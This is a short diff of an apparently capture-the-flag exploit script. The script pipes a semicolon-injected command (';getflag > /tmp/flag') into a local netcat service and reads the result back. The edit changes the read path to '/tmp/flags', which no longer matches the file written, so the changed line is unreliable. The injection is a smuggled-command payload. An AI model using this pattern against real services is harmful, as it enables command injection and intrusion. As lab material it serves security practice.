@@ -1,3 +1,3 @@
 nc localhost 5151
 ;getflag > /tmp/flag
-cat /tmp/flag
+cat /tmp/flags
